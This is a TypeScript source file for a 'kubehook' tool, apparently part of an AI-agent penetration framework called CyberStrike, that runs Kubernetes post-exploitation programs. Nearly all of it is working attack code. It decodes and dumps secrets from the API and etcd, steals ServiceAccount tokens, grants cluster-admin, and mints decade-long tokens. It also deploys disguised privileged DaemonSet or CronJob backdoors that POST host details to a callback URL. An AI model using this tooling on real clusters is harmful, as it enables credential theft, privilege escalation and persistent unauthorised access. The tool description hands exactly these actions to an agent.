import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  k8s_enum: {
    description:
      "Enumerate Kubernetes cluster: namespaces, pods, services, secrets (metadata), RBAC roles/bindings, ingress, and service accounts",
    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_secrets: {
    description:
      "Extract and base64-decode Kubernetes Secrets from all accessible namespaces. Filters by type (Opaque, TLS, docker-registry)",
    args: "[--namespace NS] [--type TYPE] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_escape: {
    description:
      "Detect and exploit container escape vectors: privileged mode, hostPID/hostNetwork, writable hostPath, mounted docker socket, SYS_ADMIN capability",
    args: "[--exploit] [--kubeconfig PATH] [--context CTX]",
  },
  k8s_privesc: {
    description:
      "Kubernetes RBAC privilege escalation: steal ServiceAccount tokens, create ClusterRoleBinding for cluster-admin, abuse token request API",
    args: "--method <sa_token|bind_admin|token_request> [--namespace NS] [--sa-name NAME] [--kubeconfig PATH] [--context CTX]",
  },
  etcd_dump: {
    description:
      "Connect directly to etcd and extract all Kubernetes secrets from /registry/secrets/ prefix. Requires etcd credentials or certs",
    args: "--endpoint ENDPOINT [--cert CERT] [--key KEY] [--ca CA]",
  },
  k8s_backdoor: {
    description:
      "Deploy persistent backdoor via DaemonSet (runs on every node) or CronJob (periodic callback) with configurable image and callback URL",
    args: "--type <daemonset|cronjob> --image IMAGE [--callback-url URL] [--namespace NS] [--kubeconfig PATH] [--context CTX]",
  },
  cleanup_k8s: {
    description:
      "Remove all CyberStrike-created Kubernetes resources (by label app=cyberstrike): DaemonSets, CronJobs, ClusterRoleBindings, Pods. ALWAYS run before leaving",
    args: "[--kubeconfig PATH] [--context CTX] [--dry-run]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = {
  checkId: string
  provider: string
  severity: string
  status: string
  resource: string
  title: string
  details: string
  remediation: string
}
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(
  cmd: string,
  args: string[],
  timeout: number,
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function tryJson(s: string) {
  try {
    return JSON.parse(s)
  } catch {
    return null
  }
}

function kc(args: string[], kubeconfig: string | undefined, ctx: string | undefined, timeout: number) {
  const extra = [...(kubeconfig ? ["--kubeconfig", kubeconfig] : []), ...(ctx ? ["--context", ctx] : [])]
  return run("kubectl", [...args, ...extra, "-o", "json"], timeout)
}

function kcText(args: string[], kubeconfig: string | undefined, ctx: string | undefined, timeout: number) {
  const extra = [...(kubeconfig ? ["--kubeconfig", kubeconfig] : []), ...(ctx ? ["--context", ctx] : [])]
  return run("kubectl", [...args, ...extra], timeout)
}

// ── Programs ──

async function k8sEnum(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Kubernetes cluster...\n"]

  const clusterInfo = await kcText(["cluster-info"], kubeconfig, ctx, timeout)
  if (clusterInfo.exitCode === 0) output.push(`[+] Cluster info:\n${clusterInfo.stdout}\n`)

  const whoami = await kcText(["auth", "whoami"], kubeconfig, ctx, timeout)
  if (whoami.exitCode === 0) output.push(`[+] Current identity:\n${whoami.stdout}\n`)

  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
  const namespaces = nsResult.exitCode === 0 ? tryJson(nsResult.stdout)?.items || [] : []
  output.push(`[+] Namespaces: ${namespaces.length}`)
  for (const n of namespaces) output.push(`    ${n.metadata.name} (${n.status?.phase})`)

  const targetNs = ns ? [ns] : namespaces.map((n: Record<string, Record<string, string>>) => n.metadata.name)
  for (const n of targetNs) {
    output.push(`\n${"─".repeat(40)}\n[*] Namespace: ${n}`)

    const pods = await kc(["get", "pods", "-n", n], kubeconfig, ctx, timeout)
    if (pods.exitCode === 0) {
      const items = tryJson(pods.stdout)?.items || []
      output.push(`  Pods: ${items.length}`)
      for (const p of items) {
        const containers = (p.spec?.containers || []).map((c: Record<string, string>) => c.name).join(",")
        output.push(`    ${p.metadata.name} (${p.status?.phase}) — containers: ${containers}`)
      }
    }

    const svcs = await kc(["get", "services", "-n", n], kubeconfig, ctx, timeout)
    if (svcs.exitCode === 0) {
      const items = tryJson(svcs.stdout)?.items || []
      output.push(`  Services: ${items.length}`)
      for (const s of items) {
        const ports = (s.spec?.ports || [])
          .map((p: Record<string, string | number>) => `${p.port}/${p.protocol}`)
          .join(",")
        output.push(`    ${s.metadata.name} (${s.spec?.type}) — ${ports}`)
      }
    }

    const secrets = await kc(["get", "secrets", "-n", n], kubeconfig, ctx, timeout)
    if (secrets.exitCode === 0) {
      const items = tryJson(secrets.stdout)?.items || []
      output.push(`  Secrets: ${items.length}`)
      for (const s of items)
        output.push(`    ${s.metadata.name} (${s.type}) — ${Object.keys(s.data || {}).length} key(s)`)
    }

    const sas = await kc(["get", "serviceaccounts", "-n", n], kubeconfig, ctx, timeout)
    if (sas.exitCode === 0) {
      const items = tryJson(sas.stdout)?.items || []
      output.push(`  ServiceAccounts: ${items.length}`)
      for (const sa of items) output.push(`    ${sa.metadata.name}`)
    }

    const ingresses = await kc(["get", "ingresses", "-n", n], kubeconfig, ctx, timeout)
    if (ingresses.exitCode === 0) {
      const items = tryJson(ingresses.stdout)?.items || []
      if (items.length > 0) {
        output.push(`  Ingresses: ${items.length}`)
        for (const ing of items) {
          const hosts = (ing.spec?.rules || []).map((r: Record<string, string>) => r.host || "*").join(",")
          output.push(`    ${ing.metadata.name} — hosts: ${hosts}`)
        }
      }
    }
  }

  const crbs = await kc(["get", "clusterrolebindings"], kubeconfig, ctx, timeout)
  if (crbs.exitCode === 0) {
    const items = tryJson(crbs.stdout)?.items || []
    output.push(`\n[+] ClusterRoleBindings: ${items.length}`)
    for (const b of items) {
      if (b.metadata.name.startsWith("system:")) continue
      const subjects = (b.subjects || []).map((s: Record<string, string>) => `${s.kind}/${s.name}`).join(",")
      output.push(`    ${b.metadata.name} → ${b.roleRef.name} — ${subjects}`)
      if (b.roleRef.name === "cluster-admin") {
        for (const s of b.subjects || []) {
          if (s.name === "system:masters") continue
          findings.push({
            checkId: "K8S-ENUM-001",
            provider: "kubernetes",
            severity: "critical",
            status: "FAIL",
            resource: `ClusterRoleBinding/${b.metadata.name}`,
            title: `cluster-admin bound to ${s.kind}/${s.name}`,
            details: `${s.kind} "${s.name}" has cluster-admin privileges.`,
            remediation: "Review if cluster-admin is necessary for this identity.",
          })
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function k8sSecrets(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const filterType = argVal(args, "--type")
  const output: string[] = ["[*] Extracting Kubernetes secrets...\n"]

  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
  const namespaces = ns
    ? [ns]
    : nsResult.exitCode === 0
      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
      : ["default"]

  let total = 0
  for (const n of namespaces) {
    const secrets = await kc(["get", "secrets", "-n", n], kubeconfig, ctx, timeout)
    if (secrets.exitCode !== 0) continue
    const items = tryJson(secrets.stdout)?.items || []
    for (const s of items) {
      if (filterType && s.type !== filterType) continue
      if (s.type === "kubernetes.io/service-account-token" && !filterType) continue
      total++
      output.push(`\n[+] ${n}/${s.metadata.name} (${s.type})`)
      const data = s.data || {}
      for (const [key, val] of Object.entries(data)) {
        const decoded = Buffer.from(String(val), "base64").toString("utf-8")
        const preview = decoded.length > 200 ? decoded.slice(0, 200) + "..." : decoded
        output.push(`    ${key}: ${preview}`)
      }
    }
  }

  output.push(`\n[*] Total extracted: ${total} secret(s)`)
  return { output: output.join("\n"), findings: [] }
}

async function k8sEscape(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const exploit = args.includes("--exploit")
  const findings: Finding[] = []
  const output: string[] = ["[*] Scanning for container escape vectors...\n"]

  const pods = await kc(["get", "pods", "--all-namespaces"], kubeconfig, ctx, timeout)
  if (pods.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list pods", findings }

  const items = tryJson(pods.stdout)?.items || []
  for (const pod of items) {
    const ns = pod.metadata.namespace
    const name = pod.metadata.name
    const spec = pod.spec || {}
    const vectors: string[] = []

    if (spec.hostPID) vectors.push("hostPID")
    if (spec.hostNetwork) vectors.push("hostNetwork")
    if (spec.hostIPC) vectors.push("hostIPC")

    const containers = [...(spec.containers || []), ...(spec.initContainers || [])]
    for (const c of containers) {
      const sc = c.securityContext || {}
      if (sc.privileged) vectors.push(`privileged(${c.name})`)
      const caps = sc.capabilities?.add || []
      if (caps.includes("SYS_ADMIN")) vectors.push(`SYS_ADMIN(${c.name})`)
      if (caps.includes("SYS_PTRACE")) vectors.push(`SYS_PTRACE(${c.name})`)
    }

    const volumes = spec.volumes || []
    for (const v of volumes) {
      if (v.hostPath?.path === "/var/run/docker.sock") vectors.push("docker.sock")
      if (v.hostPath?.path === "/") vectors.push("hostPath:/")
      if (v.hostPath?.path === "/etc") vectors.push("hostPath:/etc")
    }

    if (vectors.length > 0) {
      output.push(`[!] ${ns}/${name}: ${vectors.join(", ")}`)
      findings.push({
        checkId: "K8S-ESC-001",
        provider: "kubernetes",
        severity: "critical",
        status: "FAIL",
        resource: `${ns}/Pod/${name}`,
        title: `Container escape vectors: ${vectors.join(", ")}`,
        details: `Pod "${name}" has ${vectors.length} escape vector(s). ${exploit ? "Exploit mode enabled." : "Use --exploit to attempt breakout."}`,
        remediation: "Remove privileged mode, dangerous capabilities, and sensitive hostPath mounts.",
      })
    }
  }

  if (exploit) {
    output.push("\n[*] Exploit mode — checking local pod environment...")
    const saToken = await run("cat", ["/var/run/secrets/kubernetes.io/serviceaccount/token"], 5)
    if (saToken.exitCode === 0) {
      output.push(`[+] ServiceAccount token found: ${saToken.stdout.slice(0, 40)}...`)
    }
    const dockerSock = await run("ls", ["-la", "/var/run/docker.sock"], 5)
    if (dockerSock.exitCode === 0) {
      output.push("[+] Docker socket accessible! Can create privileged containers.")
    }
    const procCheck = await run("ls", ["/proc/1/root"], 5)
    if (procCheck.exitCode === 0) {
      output.push("[+] Can access host PID 1 root — host filesystem breakout possible")
    }
  }

  output.push(`\n[*] Scan complete: ${findings.length} pod(s) with escape vectors`)
  return { output: output.join("\n"), findings }
}

async function k8sPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const method = argVal(args, "--method")
  const ns = argVal(args, "--namespace") || "default"
  const saName = argVal(args, "--sa-name")
  const output: string[] = []

  if (!method) return { output: "[-] --method required: sa_token, bind_admin, or token_request", findings: [] }

  if (method === "sa_token") {
    output.push("[*] Stealing ServiceAccount tokens...\n")
    const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
    const namespaces =
      nsResult.exitCode === 0
        ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
        : [ns]
    for (const n of namespaces) {
      const secrets = await kc(["get", "secrets", "-n", n], kubeconfig, ctx, timeout)
      if (secrets.exitCode !== 0) continue
      const items = tryJson(secrets.stdout)?.items || []
      for (const s of items) {
        if (s.type !== "kubernetes.io/service-account-token") continue
        const token = s.data?.token ? Buffer.from(s.data.token, "base64").toString("utf-8") : ""
        if (token) {
          output.push(`[+] ${n}/${s.metadata.name}:`)
          output.push(`    SA: ${s.metadata.annotations?.["kubernetes.io/service-account.name"] || "unknown"}`)
          output.push(`    Token: ${token.slice(0, 50)}...`)
        }
      }
    }
  }

  if (method === "bind_admin") {
    output.push("[*] Creating cluster-admin binding...\n")
    const target = saName || "default"
    const bindingName = `cs-admin-${Date.now()}`
    const create = await kcText(
      ["create", "clusterrolebinding", bindingName, "--clusterrole=cluster-admin", `--serviceaccount=${ns}:${target}`],
      kubeconfig,
      ctx,
      timeout,
    )
    output.push(
      create.exitCode === 0
        ? `[+] ClusterRoleBinding "${bindingName}" created — ${ns}:${target} is now cluster-admin`
        : `[-] Failed: ${create.stderr.slice(0, 200)}`,
    )
  }

  if (method === "token_request") {
    output.push("[*] Requesting token via TokenRequest API...\n")
    const target = saName || "default"
    const tokenReq = await run(
      "kubectl",
      [
        "create",
        "token",
        target,
        "-n",
        ns,
        "--duration=87600h",
        ...(kubeconfig ? ["--kubeconfig", kubeconfig] : []),
        ...(ctx ? ["--context", ctx] : []),
      ],
      timeout,
    )
    output.push(
      tokenReq.exitCode === 0
        ? `[+] Token for ${ns}/${target}:\n${tokenReq.stdout.slice(0, 80)}...`
        : `[-] Failed: ${tokenReq.stderr.slice(0, 200)}`,
    )
  }

  return { output: output.join("\n"), findings: [] }
}

async function etcdDump(args: string[], timeout: number): Promise<HookResult> {
  const endpoint = argVal(args, "--endpoint")
  const cert = argVal(args, "--cert")
  const key = argVal(args, "--key")
  const ca = argVal(args, "--ca")
  const output: string[] = []

  if (!endpoint) return { output: "[-] --endpoint required (e.g. https://etcd-host:2379)", findings: [] }

  output.push(`[*] Connecting to etcd at ${endpoint}...\n`)

  const check = await run("which", ["etcdctl"], 5)
  if (check.exitCode !== 0)
    return { output: output.join("\n") + "[-] etcdctl not found. Install etcd client tools.", findings: [] }

  const etcdArgs = [
    "--endpoints",
    endpoint,
    ...(cert ? ["--cert", cert] : []),
    ...(key ? ["--key", key] : []),
    ...(ca ? ["--cacert", ca] : []),
  ]

  const health = await run("etcdctl", [...etcdArgs, "endpoint", "health"], timeout)
  output.push(
    health.exitCode === 0
      ? `[+] etcd healthy: ${health.stdout.trim()}`
      : `[-] Health check failed: ${health.stderr.slice(0, 200)}`,
  )

  output.push("\n[*] Extracting secrets from /registry/secrets/...")
  const secrets = await run("etcdctl", [...etcdArgs, "get", "/registry/secrets/", "--prefix", "--keys-only"], timeout)
  if (secrets.exitCode === 0) {
    const keys = secrets.stdout.split("\n").filter(Boolean)
    output.push(`[+] Found ${keys.length} secret key(s)`)
    for (const k of keys.slice(0, 50)) {
      output.push(`    ${k}`)
      const val = await run("etcdctl", [...etcdArgs, "get", k, "--print-value-only"], timeout)
      if (val.exitCode === 0 && val.stdout.trim()) {
        output.push(`      Value: ${val.stdout.trim().slice(0, 100)}...`)
      }
    }
    if (keys.length > 50) output.push(`    ... and ${keys.length - 50} more`)
  } else {
    output.push(`[-] Failed to read secrets: ${secrets.stderr.slice(0, 200)}`)
  }

  return { output: output.join("\n"), findings: [] }
}

async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const type = argVal(args, "--type")
  const image = argVal(args, "--image")
  const callbackUrl = argVal(args, "--callback-url")
  const ns = argVal(args, "--namespace") || "default"
  const output: string[] = []

  if (!type) return { output: "[-] --type required: daemonset or cronjob", findings: [] }
  if (!image) return { output: "[-] --image required (container image for backdoor)", findings: [] }

  if (type === "daemonset") {
    const name = `cs-monitor-${Date.now().toString(36).slice(-6)}`
    const cmd = callbackUrl
      ? `while true; do curl -s -X POST ${callbackUrl} -d "host=$(hostname)&ns=${ns}&type=daemonset"; sleep 3600; done`
      : "sleep infinity"
    const manifest = JSON.stringify({
      apiVersion: "apps/v1",
      kind: "DaemonSet",
      metadata: { name, namespace: ns, labels: { app: "cyberstrike" } },
      spec: {
        selector: { matchLabels: { app: "cyberstrike", component: name } },
        template: {
          metadata: { labels: { app: "cyberstrike", component: name } },
          spec: {
            containers: [
              {
                name: "agent",
                image,
                command: ["/bin/sh", "-c", cmd],
                securityContext: { privileged: true },
                volumeMounts: [{ name: "host", mountPath: "/host", readOnly: false }],
              },
            ],
            volumes: [{ name: "host", hostPath: { path: "/", type: "Directory" } }],
            hostPID: true,
            hostNetwork: true,
          },
        },
      },
    })

    const tmpFile = `/tmp/cs-ds-${Date.now()}.json`
    await Bun.write(tmpFile, manifest)
    output.push(`[*] Deploying DaemonSet "${name}" to ${ns}...`)
    const apply = await kcText(["apply", "-f", tmpFile], kubeconfig, ctx, timeout)
    output.push(
      apply.exitCode === 0
        ? `[+] DaemonSet deployed — runs on every node with host access`
        : `[-] Failed: ${apply.stderr.slice(0, 200)}`,
    )
  }

  if (type === "cronjob") {
    const name = `cs-health-${Date.now().toString(36).slice(-6)}`
    const cmd = callbackUrl
      ? `curl -s -X POST ${callbackUrl} -d "host=$(hostname)&ns=${ns}&type=cronjob"`
      : "echo heartbeat"
    const manifest = JSON.stringify({
      apiVersion: "batch/v1",
      kind: "CronJob",
      metadata: { name, namespace: ns, labels: { app: "cyberstrike" } },
      spec: {
        schedule: "*/30 * * * *",
        jobTemplate: {
          spec: {
            template: {
              metadata: { labels: { app: "cyberstrike", component: name } },
              spec: {
                containers: [
                  {
                    name: "callback",
                    image,
                    command: ["/bin/sh", "-c", cmd],
                  },
                ],
                restartPolicy: "Never",
              },
            },
          },
        },
      },
    })

    const tmpFile = `/tmp/cs-cj-${Date.now()}.json`
    await Bun.write(tmpFile, manifest)
    output.push(`[*] Deploying CronJob "${name}" to ${ns}...`)
    const apply = await kcText(["apply", "-f", tmpFile], kubeconfig, ctx, timeout)
    output.push(
      apply.exitCode === 0
        ? `[+] CronJob deployed — runs every 30 minutes`
        : `[-] Failed: ${apply.stderr.slice(0, 200)}`,
    )
  }

  return { output: output.join("\n"), findings: [] }
}

async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const dryRun = args.includes("--dry-run")
  const output: string[] = [
    dryRun
      ? "[*] CLEANUP DRY RUN — no changes will be made\n"
      : "[*] Cleaning up CyberStrike Kubernetes resources...\n",
  ]
  let cleaned = 0

  const resources = ["daemonsets", "cronjobs", "pods", "jobs"]
  for (const res of resources) {
    const list = await kc(["get", res, "--all-namespaces", "-l", "app=cyberstrike"], kubeconfig, ctx, timeout)
    if (list.exitCode !== 0) continue
    const items = tryJson(list.stdout)?.items || []
    for (const item of items) {
      const ns = item.metadata.namespace
      const name = item.metadata.name
      if (dryRun) {
        output.push(`  [DRY] Would delete ${res}/${name} in ${ns}`)
      } else {
        const del = await kcText(["delete", res, name, "-n", ns], kubeconfig, ctx, timeout)
        output.push(
          del.exitCode === 0 ? `  [+] Deleted ${res}/${name} from ${ns}` : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
        )
      }
      cleaned++
    }
  }

  const crbs = await kc(["get", "clusterrolebindings", "-l", "app=cyberstrike"], kubeconfig, ctx, timeout)
  if (crbs.exitCode === 0) {
    const items = tryJson(crbs.stdout)?.items || []
    for (const b of items) {
      if (dryRun) {
        output.push(`  [DRY] Would delete ClusterRoleBinding/${b.metadata.name}`)
      } else {
        const del = await kcText(["delete", "clusterrolebinding", b.metadata.name], kubeconfig, ctx, timeout)
        output.push(
          del.exitCode === 0
            ? `  [+] Deleted ClusterRoleBinding/${b.metadata.name}`
            : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
        )
      }
      cleaned++
    }
  }

  const crbsByName = await kc(["get", "clusterrolebindings"], kubeconfig, ctx, timeout)
  if (crbsByName.exitCode === 0) {
    const items = tryJson(crbsByName.stdout)?.items || []
    for (const b of items) {
      if (!String(b.metadata.name).startsWith("cs-")) continue
      if (dryRun) {
        output.push(`  [DRY] Would delete ClusterRoleBinding/${b.metadata.name} (cs-* prefix)`)
      } else {
        const del = await kcText(["delete", "clusterrolebinding", b.metadata.name], kubeconfig, ctx, timeout)
        output.push(
          del.exitCode === 0
            ? `  [+] Deleted ClusterRoleBinding/${b.metadata.name}`
            : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
        )
      }
      cleaned++
    }
  }

  output.push(`\n[*] Cleanup complete: ${cleaned} resource(s) ${dryRun ? "found" : "removed"}`)
  return { output: output.join("\n"), findings: [] }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const KubehookTool = Tool.define("kubehook", {
  description: `Execute a Kubernetes post-exploitation program after compromising a pod or obtaining kubeconfig. Uses kubectl CLI (no Python/SDK dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_k8s before leaving a target.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "Kubernetes program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    const check = await run("which", ["kubectl"], 5)
    if (check.exitCode !== 0) {
      return {
        title: `kubehook: ${params.program}`,
        output: "kubectl not found. Install: https://kubernetes.io/docs/tasks/tools/",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      k8s_enum: () => k8sEnum(params.args, params.timeout_seconds),
      k8s_secrets: () => k8sSecrets(params.args, params.timeout_seconds),
      k8s_escape: () => k8sEscape(params.args, params.timeout_seconds),
      k8s_privesc: () => k8sPrivesc(params.args, params.timeout_seconds),
      etcd_dump: () => etcdDump(params.args, params.timeout_seconds),
      k8s_backdoor: () => k8sBackdoor(params.args, params.timeout_seconds),
      cleanup_k8s: () => cleanupK8s(params.args, params.timeout_seconds),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `kubehook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `kubehook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
